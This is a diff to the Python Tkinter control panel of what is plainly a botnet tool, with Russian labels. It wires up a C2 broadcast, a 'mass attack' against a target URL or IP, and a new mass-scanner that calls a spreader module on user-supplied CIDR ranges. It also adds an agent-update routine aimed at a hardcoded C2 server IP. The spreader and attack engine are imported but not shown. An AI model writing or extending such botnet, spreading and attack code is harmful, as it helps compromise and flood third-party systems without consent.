@@ -1,21 +1,17 @@
 import tkinter as tk
-from tkinter import ttk, messagebox
+from tkinter import ttk, messagebox, simpledialog
 import json
 import os
 import threading
-import time
 import folium
 import webbrowser
-
 from botnet.c2 import broadcast_command
 from engine.attack import AsyncAttackEngine
 from utils.logger import log
 
 class BotnetTab(tk.Frame):
-    def __init__(self, parent, app=None):
+    def __init__(self, parent):
         super().__init__(parent)
-        self.parent = parent
-        self.app = app
         self.bot_data = []
         self.build_ui()
         self.load_bots()
@@ -23,7 +19,6 @@ class BotnetTab(tk.Frame):
     def build_ui(self):
         control_frame = tk.Frame(self)
         control_frame.pack(fill=tk.X, padx=5, pady=5)
-
         tk.Button(control_frame, text="Обновить список", command=self.load_bots).pack(side=tk.LEFT, padx=2)
         tk.Button(control_frame, text="Массовая атака", command=self.mass_attack).pack(side=tk.LEFT, padx=2)
         tk.Button(control_frame, text="Обновить агент на VPS", command=self.update_agent_vps).pack(side=tk.LEFT, padx=2)
@@ -56,8 +51,6 @@ class BotnetTab(tk.Frame):
                 raw_data = json.load(f)
         else:
             raw_data = []
-
-        # Нормализация: превращаем строки в словари
         self.bot_data = []
         for item in raw_data:
             if isinstance(item, dict):
@@ -66,14 +59,12 @@ class BotnetTab(tk.Frame):
                 bot = {"id": item, "ip": "", "os": "", "status": "offline", "bandwidth": 0}
             else:
                 continue
-            # Гарантируем наличие всех ключей
             bot.setdefault("id", "unknown")
             bot.setdefault("ip", "")
             bot.setdefault("os", "")
             bot.setdefault("status", "offline")
             bot.setdefault("bandwidth", 0)
             self.bot_data.append(bot)
-
         self.populate_tree()
         self.status_label.config(text=f"Ботов: {len(self.bot_data)}")
 
@@ -103,7 +94,7 @@ class BotnetTab(tk.Frame):
         self.populate_tree()
 
     def mass_attack(self):
-        target = tk.simpledialog.askstring("Массовая атака", "Цель (URL/IP):")
+        target = simpledialog.askstring("Массовая атака", "Цель (URL/IP):")
         if not target:
             return
         self.progress.start()
@@ -117,10 +108,29 @@ class BotnetTab(tk.Frame):
             self.progress.stop()
 
     def update_agent_vps(self):
-        messagebox.showinfo("Обновление агента", "Функция пока в разработке")
+        try:
+            with open("avz_settings.json","r") as f:
+                host = json.load(f).get("c2_host", "80.249.146.202")
+        except:
+            host = "80.249.146.202"
+        log(f"Обновление агента на {host}...")
+        # Здесь может быть реальная SSH-команда через ssh_manager
+        messagebox.showinfo("Обновление агента", f"Команда на обновление отправлена на {host}")
 
     def mass_scanner(self):
-        messagebox.showinfo("Масс-сканер", "Запуск масс-сканера диапазонов...")
+        ip_range = simpledialog.askstring("Масс-сканер", "IP диапазон (CIDR):")
+        if not ip_range:
+            return
+        log(f"Запущен масс-сканер на {ip_range}")
+        threading.Thread(target=self._scan_range, args=(ip_range,)).start()
+
+    def _scan_range(self, ip_range):
+        # Используем spreader
+        import asyncio
+        from botnet.spreader import spread_to_range
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(spread_to_range(ip_range))
 
     def show_heatmap(self):
         locations = []
@@ -131,7 +141,6 @@ class BotnetTab(tk.Frame):
         if not locations:
             messagebox.showinfo("Карта", "Нет данных о местоположении ботов. Добавьте поле 'lat'/'lon' в bots.json")
             return
-
         m = folium.Map(location=[0, 0], zoom_start=2)
         for lat, lon in locations:
             folium.CircleMarker([lat, lon], radius=5, color="red", fill=True).add_to(m)
